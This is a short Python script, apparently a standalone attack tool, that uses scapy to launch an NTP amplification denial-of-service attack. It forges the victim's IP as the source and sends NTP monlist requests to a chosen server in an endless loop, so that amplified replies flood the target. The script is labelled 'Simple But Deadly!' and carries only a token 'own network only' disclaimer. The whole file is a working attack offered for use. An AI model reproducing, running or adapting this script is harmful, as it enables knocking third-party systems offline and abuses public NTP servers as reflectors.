#NTP Amp DOS attack
#usage ntpdos.py <target ip> <ntpserver to attack with> ex: ntpdos.py 1.2.3.4 4.3.2.1
#Simple But Deadly!
#FOR USE ON YOUR OWN NETWORK ONLY
from scapy.all import *
import sys
target=sys.argv[1]
ntpserver=sys.argv[2]
data=str("\x17\x00\x03\x2a") + str("\x00")*4
print "Starting to flood: "+ target + " using NTP: " + ntpserver
print "Use CTRL+C to stop attack"
packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data)
send(packet,loop=1)
